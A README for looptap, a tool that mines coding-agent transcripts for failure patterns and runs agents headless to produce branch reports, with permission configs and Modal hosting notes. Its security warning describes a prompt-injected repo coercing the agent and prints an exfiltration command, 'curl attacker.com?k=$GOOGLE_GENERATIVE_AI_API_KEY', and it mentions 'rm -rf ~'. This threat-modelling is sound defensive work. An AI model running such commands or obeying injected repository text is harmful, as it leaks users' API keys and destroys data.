# looptap

`strace` but for vibes. Reads your coding agent transcripts, finds the rough patches — correction loops, tool call death spirals, dead ends — and dumps it to SQLite.

## Try it

```bash
curl -fsSL https://raw.githubusercontent.com/TanGentleman/looptap/main/scripts/install.sh | bash
```

```bash
looptap run        # parse transcripts + detect signals
looptap info       # what'd we find?
looptap advise     # ask Gemini for CLAUDE.md fixes based on your signals
looptap analyze    # quality-review your ~/.claude/CLAUDE.md
looptap html       # hand a branch to a coding agent, get a shareable HTML report back
```

`advise` and `analyze` need a Gemini API key — set `GOOGLE_API_KEY`. `html` shells out to a coding-agent CLI in headless mode: either `claude` (the default, override with `LOOPTAP_CLAUDE_BIN`) or `opencode` (override with `LOOPTAP_OPENCODE_BIN`). Pick with `--agent`.

```bash
# default: Claude Code
looptap html --repo /path/to/repo --branch current --output report.html --force

# opencode on your laptop — locked-down default, safe against prompt injection
looptap html --agent opencode --repo /path/to/repo --output report.html --force

# opencode in CI / a disposable container — open the leash
looptap html --agent opencode --is-sandbox --repo /path/to/repo --output report.html --force

# opencode with your own config (model, provider creds, tool allowlist, etc.)
looptap html --agent opencode --opencode-config ./opencode.json \
  --repo /path/to/repo --output report.html --force
```

Without `--opencode-config`, looptap ships two embedded defaults and picks between them based on `--is-sandbox`:

- **default (laptop-safe)**: `read`/`glob`/`grep`/`list` allowed, `edit`/`webfetch`/`websearch` denied, and `bash` is a narrow allowlist of read-only git subcommands — a prompt-injected repo can't `rm -rf ~` through this one. Uses of `--dangerously-skip-permissions` are also off.
- **`--is-sandbox`**: opens `bash` fully and turns on `--dangerously-skip-permissions`. Use in CI or a disposable container where the blast radius is already contained.

Either way, copy [`internal/htmlreport/opencode.default.json`](internal/htmlreport/opencode.default.json) or [`opencode.sandbox.json`](internal/htmlreport/opencode.sandbox.json) as a starting point for your own config.

Repo, branch, agent, opencode config, and sandbox also read from `LOOPTAP_REPO_PATH`, `LOOPTAP_BRANCH` (`current` | `default` | a branch name), `LOOPTAP_AGENT` (`claude` | `opencode`), `LOOPTAP_OPENCODE_CONFIG`, and `LOOPTAP_SANDBOX` (`1`/`true`). Without `--force` you get a confirmation prompt showing the resolved repo, branch, and agent before anything runs.

### Hosted on Modal

Want `looptap analyze` reachable over HTTP? `cp example.env .env`, fill in the creds, then:

```bash
./scripts/setup.sh   # preflights Gemini, upserts the looptap-secrets Modal secret
./scripts/deploy.sh  # builds a linux binary, deploys deploy/app.py, smokes /healthz
```

The endpoint is gated by [Modal proxy auth tokens](https://modal.com/docs/guide/webhook-proxy-auth) — a raw `curl` gets a 401. Create a pair at <https://modal.com/settings/proxy-auth-tokens> and send them on **every** request:

```bash
curl -H "Modal-Key: $MODAL_PROXY_TOKEN_ID" \
     -H "Modal-Secret: $MODAL_PROXY_TOKEN_SECRET" \
     "$URL/analyze"
```

Any client code that calls this server — scripts, CI jobs, another service — needs the same two headers. `GOOGLE_API_KEY` rides along via `Secret.from_name("looptap-secrets")` and the function forwards it into the subprocess env explicitly.

**Use a scoped/ephemeral provider key.** `POST /analyze-repo` runs opencode in a Modal sandbox with `bash: allow` in [`deploy/opencode.hosted.json`](deploy/opencode.hosted.json) — that's what lets the agent run `git log`, `rg`, etc. The disposable container contains the filesystem blast radius, but the provider key is in the sandbox env and a prompt-injected repo can coerce the agent into running `curl attacker.com?k=$GOOGLE_GENERATIVE_AI_API_KEY`. Best practice: put a rate-limited, short-lived, single-purpose key in `looptap-secrets` (Google AI Studio lets you mint per-project keys), rotate on a schedule, and treat it as "a key you're willing to lose." Never drop your primary Gemini key into this secret.

Browse the DB with datasette:

```bash
uvx datasette ~/.looptap/looptap.db --metadata metadata.json
```

## Branch reports from CI

[`.github/workflows/html-report.yml`](.github/workflows/html-report.yml) drives `looptap html` via opencode on `google/gemini-3.1-flash-lite-preview`. Dispatch it from the Actions tab with a branch name; the rendered HTML falls out as a workflow artifact. The agent config is inlined in the workflow (written from the trusted default branch, not from the branch under inspection) — read/glob/grep/list plus a narrow git-read-only bash allowlist, with edit/webfetch/websearch denied.

**Setup**: add a `GOOGLE_GENERATIVE_AI_API_KEY` repository secret before the first run — **Settings → Secrets and variables → Actions → New repository secret**, name `GOOGLE_GENERATIVE_AI_API_KEY`, value your Google AI Studio key. That's the variable opencode's google provider reads; the workflow refuses to run without it. Swap the provider/model in the workflow's inline config if you'd rather use a different key (remember to rename the secret too).

---

Deeper dive: [ARCHITECTURE.md](ARCHITECTURE.md) — signals, schema, config, all the knobs.
